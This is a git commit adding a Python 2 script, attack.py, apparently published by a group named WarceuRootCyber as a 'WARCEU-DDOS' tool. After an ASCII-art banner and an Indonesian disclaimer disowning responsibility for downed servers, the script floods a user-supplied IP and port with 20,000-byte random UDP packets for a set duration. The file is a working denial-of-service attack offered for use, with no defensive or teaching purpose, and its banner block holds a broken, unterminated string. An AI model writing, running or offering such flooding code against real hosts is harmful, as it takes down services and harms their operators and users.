22d58b4cfa005e00abf783b0290139a89cac14a8
WarceuRootCyber <66877990+WarceuRootCyber@users.noreply.github.com>
2020-06-22 00:13:24 +0700

    attack.py

---
+++ attack.py
@@ -0,0 +1,67 @@
+import time
+import socket
+import random
+import sys
+def usage():
+    print "\33[0;32m:::!~!!!!!:.
+                  .xUHWH!! !!?M88WHX:.
+                .X*#M@$!!  !X!M$$$$$$WWx:.
+               :!!!!!!?H! :!$!$$$$$$$$$$8X:
+              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
+             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
+             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
+               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
+   print  "\033[1;32m    ~?WuxiW*`   `"#$$$$8!!!!??!!!
+             :X- M$$$$       `"T#$T~!8$WUXU~
+            :%`  ~#$$$m:        ~!~ ?$$$$$$
+          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
+.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
+W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
+#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
+:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
+.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
+Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
+$R@i.~~ !     :   ~$$$$$B$$en:``
+?MXT@Wx.~    :     ~"##*$$$$M~ 
+    print "\033[1;32m############################################################"
+    print "#-----------------------[\033[1;91mWARCEU-DDOS\033[1;32m]-----------------------#"
+    print "#----------------------------------------------------------#"
+    print "#   \033[1;91mCommand: " "python2 attack.py " "<ip> <port> <packet> \033[1;32m #"
+    print "#                                                        ##"
+    print "#\033[1;91mCreator:Light ID  \033[1;32m##      #      #                     ##"
+    print "#\033[1;91mTeam   : WarceuRootCyber        \033[1;32m##     #      #                     ##"
+    print "#\033[1;91mVersion:1.0        \033[1;32m##         ##"
+    print "#\033[1;91mTQ  :for crew INTRAKTIF est.287##"
+    print "#                     \033[1;91m ##     \033[1;32m#  \033[1;91m  \033[1;32   ##"
+    print "#                     \033[1;91m##  \033[1;32m###   \033[1;91m  \033[1;32m   ##"
+    print "#               \033[1;91m<--[☆WARCEU ROOT CYBER☆]-->         \033[1;32m  ##"
+    print "############################################################"
+    print "     NOTE:Gunakan dengan bijak,kami tidak bertanggung jawab"
+    print "          atas down nya suatu server target"
+    print "          Jadilah Attckers yang bijaksana :)"
+def flood(victim, vport, duration):
+    # Support us yaakk... :)
+    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 20000 representasi satu byte ke server
+    bytes = random._urandom(20000)
+    timeout =  time.time() + duration
+    sent = 3000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
